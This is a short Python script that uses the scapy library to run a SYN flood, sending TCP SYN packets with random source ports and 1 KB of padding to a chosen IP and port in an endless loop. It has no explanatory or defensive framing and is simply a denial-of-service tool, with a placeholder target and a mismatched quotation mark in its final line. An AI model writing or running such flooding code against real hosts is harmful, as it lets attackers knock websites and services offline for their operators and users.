from scapy.all import *
def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*1024) #add 1kb of data
    packet = ip / tcp / raw
    # send packet in a loop until CTRL+C is detected
    send(packet, loop=1, verbose=0)
if __name__ == "__main__":
    syn_flood(”Your IP", 80)
